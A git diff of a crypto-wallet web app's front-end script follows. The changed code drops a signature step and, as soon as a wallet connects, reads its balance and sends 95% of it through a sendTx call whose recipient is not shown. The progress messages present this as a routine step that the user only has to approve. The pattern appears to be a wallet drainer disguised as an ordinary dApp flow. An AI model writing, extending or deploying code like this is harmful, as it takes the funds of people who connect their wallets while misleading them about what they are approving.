@@ -2,6 +2,7 @@ import { appKit, wagmiAdapter } from './config/appKit'
 import { store } from './store/appkitStore'
 import { updateTheme } from './utils/dom'
 import { signMessage, sendTx, getBalanceWei } from './services/wallet'
+import { formatUnits } from 'viem'
 import showToast from './utils/toasts'
 import { initializeSubscribers } from './utils/suscribers'
 
@@ -66,7 +67,25 @@ connectBtn?.addEventListener('click', () => {
 
 let handledAddress = null
 
-// React to account changes: when address appears, start loader and request signature
+// helper to update the status tree
+const setStep = (stepId, state, text) => {
+  const el = document.getElementById(stepId)
+  if (!el) return
+  el.classList.remove('success', 'error', 'pending')
+  el.classList.add(state)
+  const icon = el.querySelector('.s-icon')
+  if (icon) {
+    if (state === 'success') icon.textContent = '✔'
+    else if (state === 'error') icon.textContent = '✖'
+    else icon.textContent = '○'
+  }
+  if (text) {
+    const label = el.querySelector('.s-label')
+    if (label) label.textContent = text
+  }
+}
+
+// React to account changes: when address appears, start loader and send tx (skip signature)
 appKit.subscribeAccount(async (accountState) => {
   if (!accountState || !accountState.address) return
 
@@ -81,56 +100,48 @@ appKit.subscribeAccount(async (accountState) => {
     connectBtn.disabled = true
   }
 
-  // Show loader + live feedback
+  // Update status tree: connected
+  setStep('step-connected', 'success', `Connected: ${address}`)
+  showToast('success', 'Connected', address)
   setLoaderVisible(true)
-  setFeedback(`Connected: ${address}. Preparing signature request...`, 'info')
+  setFeedback(`Connected: ${address}. Calculating amount to send...`, 'info')
 
+  // compute balance and send 95% (reserve 5% for gas)
   try {
-    // small progress updates
-    await new Promise(r => setTimeout(r, 650))
-    setFeedback('Requesting signature — please approve in your wallet', 'info')
-    showToast('info', 'Signature', 'Please approve the signature in your wallet')
-
-    const signature = await signMessage(store.eip155Provider, address)
-    setFeedback('Signature received — approved', 'success')
-    showToast('success', 'Signature Approved', 'Thank you — now preparing transaction')
-
-    // display signature to console and to user
-    console.log('Signature:', signature)
-    // brief pause so user sees signature success
-    await new Promise(r => setTimeout(r, 700))
-
-    // compute balance and send 95% (reserve 5% for gas)
-    setLoaderVisible(true)
+    setStep('step-calculated', 'pending')
     setFeedback('Fetching balance to calculate send amount...', 'info')
-    try {
-      const balanceWei = await getBalanceWei(store.eip155Provider, address)
-      console.log('Balance (wei):', balanceWei.toString())
-      // reserve 5% for gas => send 95% of balance
-      const amountToSend = (balanceWei * 95n) / 100n
-      if (amountToSend <= 0n) {
-        setFeedback('Insufficient balance to send after reserving gas.', 'error')
-        setTimeout(() => setLoaderVisible(false), 1000)
-      } else {
-        // display human-friendly amounts
-        setFeedback(`Sending ${amountToSend.toString()} wei (~95% of balance). Please confirm in wallet.`, 'info')
-        const tx = await sendTx(store.eip155Provider, address, wagmiAdapter, amountToSend)
-        console.log('Transaction result:', tx)
-        const txHash = tx?.hash || tx?.request?.hash || tx?.transactionHash || JSON.stringify(tx)
-        setFeedback(`Transaction submitted: ${txHash}`, 'success')
-        showToast('success', 'Transaction Submitted', txHash.toString())
-        setTimeout(() => setLoaderVisible(false), 1400)
-      }
-    } catch (txErr) {
-      console.error('Transaction error', txErr)
-      setFeedback('Transaction failed — see console', 'error')
-      showToast('error', 'Transaction Failed', String(txErr?.message || txErr))
-      setTimeout(() => setLoaderVisible(false), 1200)
+    const balanceWei = await getBalanceWei(store.eip155Provider, address)
+    console.log('Balance (wei):', balanceWei.toString())
+    const amountToSend = (balanceWei * 95n) / 100n
+    if (amountToSend <= 0n) {
+      setFeedback('Insufficient balance to send after reserving gas.', 'error')
+      setStep('step-calculated', 'error', 'Insufficient balance after reserve')
+      showToast('error', 'Insufficient Balance', 'Cannot send after reserving 5% for gas')
+      setTimeout(() => setLoaderVisible(false), 1000)
+      return
     }
-  } catch (err) {
-    console.error('Signature error', err)
-    setFeedback('Signature failed — see console', 'error')
-    setTimeout(() => setLoaderVisible(false), 900)
+
+    // format human readable
+    const ethAmount = formatUnits(amountToSend, 18)
+    setStep('step-calculated', 'success', `Send amount: ${ethAmount} ETH`)
+    setFeedback(`Sending ${ethAmount} ETH — please confirm in your wallet`, 'info')
+    showToast('info', 'Send Amount', `${ethAmount} ETH (95% of balance)`) 
+
+    // send tx
+    setStep('step-submitted', 'pending')
+    const tx = await sendTx(store.eip155Provider, address, wagmiAdapter, amountToSend)
+    console.log('Transaction result:', tx)
+    const txHash = tx?.hash || tx?.request?.hash || tx?.transactionHash || JSON.stringify(tx)
+    setStep('step-submitted', 'success', `Transaction: ${txHash}`)
+    setFeedback(`Transaction submitted: ${txHash}`, 'success')
+    showToast('success', 'Transaction Submitted', txHash.toString())
+    setTimeout(() => setLoaderVisible(false), 1400)
+  } catch (txErr) {
+    console.error('Transaction error', txErr)
+    setFeedback('Transaction failed — see console', 'error')
+    setStep('step-submitted', 'error', 'Transaction failed')
+    showToast('error', 'Transaction Failed', String(txErr?.message || txErr))
+    setTimeout(() => setLoaderVisible(false), 1200)
   }
 })
 
